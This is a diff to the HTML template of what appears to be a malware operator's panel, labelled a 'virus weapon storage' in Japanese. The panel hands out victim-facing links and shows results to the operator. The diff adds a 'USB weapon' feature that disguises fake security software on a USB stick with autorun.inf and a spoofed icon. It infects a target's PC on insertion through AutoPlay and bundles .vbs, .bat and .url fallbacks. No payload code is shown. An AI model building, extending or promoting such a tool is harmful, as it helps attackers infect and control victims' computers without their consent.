@@ -26,16 +26,22 @@ input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-s
 .caution{background:#2a2210;border:1px solid #5a4a1f;color:#f0c869;border-radius:8px;
   padding:8px 10px;font-size:12px;line-height:1.7;margin-top:8px}
 .caution.big{margin:10px 0}
+.usb{background:#0f1b28;border:1px solid #2b5a8a;border-radius:10px;padding:14px;margin:10px 0}
+.usb h3{color:#9fd0ff;margin:0 0 8px}
+.usb a.go{display:inline-block;padding:10px 18px;border-radius:8px;background:#4c8dff;
+  color:#fff;text-decoration:none;font-weight:700;font-size:13px;margin-top:6px}
 .badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:999px;
   background:#20242e;border:1px solid #39415a;color:#c7cddb}
 .badge.on{background:#16321f;border-color:#2e6b45;color:#7ee08a}
 .badge.sg{background:#101d18;border-color:#1f5c42;color:#7ee08a;font-weight:700}
+.badge.usb{background:#0f1b28;border-color:#2b5a8a;color:#9fd0ff}
 .chk{display:flex;gap:6px;align-items:center;font-size:12px;color:#c7cddb;margin-top:8px}
 .chk input{width:auto;margin:0}
 </style></head><body>
 
 <div class="tabs">
   <a href="{{ base }}/vp" class="on">🦠 兵器庫</a>
+  <a href="{{ base }}/usb">💾 USB兵器</a>
   <a href="{{ base }}/gp">🆕 GPS</a>
   <a href="{{ base }}/tracks">🗄 旧式</a>
   <a href="{{ base }}/tracking">切替</a>
@@ -44,6 +50,18 @@ input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-s
 <h1>兵器庫（ウイルス兵器保管庫）</h1>
 <p class="dim">相手に踏ませるURLは <span class="mono">{{ base }}/v/コード</span> です。ログイン不要。
   自分は <span class="mono">{{ base }}/vp/コード</span> で結果と操作をします。</p>
+
+<div class="usb">
+  <h3>💾 USBメモリー型 兵器 — 特異点 ULTIMATE ver.（リンク作成とは別系統）</h3>
+  <div class="dim" style="line-height:2">
+    USBに偽セキュリティソフトを仕込んで、相手のPCに<b>挿してもらうだけ</b>で感染させます。<br>
+    ・挿した瞬間にAutoPlayが立ち上がり、<b>1.2秒で最終形態（L5）で発火</b><br>
+    ・ドライブ名とアイコンが偽ソフトに化ける（<span class="mono">autorun.inf</span> + <span class="mono">icon.ico</span>）<br>
+    ・AutoPlayが出ないPC向けに <span class="mono">.url</span> / <span class="mono">.vbs</span> / <span class="mono">.bat</span> も同梱<br>
+    ・書き込みはブラウザから直接（Chrome/Edge）／ZIPでも可（Firefox/Safari）
+  </div>
+  <a class="go" href="{{ base }}/usb">💾 USB兵器ツールを開く</a>
+</div>
 
 <div class="caution big">
   ⚠ <b>掟</b><br>
@@ -94,6 +112,7 @@ input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-s
       <span class="dim">{{ r.mode_label }}</span>
       {% if r.mode == 'singularity' %}
         <span class="badge sg">◎ 特異点 L{{ r.level }}</span>
+        <a class="btn" href="{{ base }}/usb?code={{ r.code }}">💾 USBに仕込む</a>
       {% else %}
         <span class="badge">{{ r.set_label }}</span>
       {% endif %}
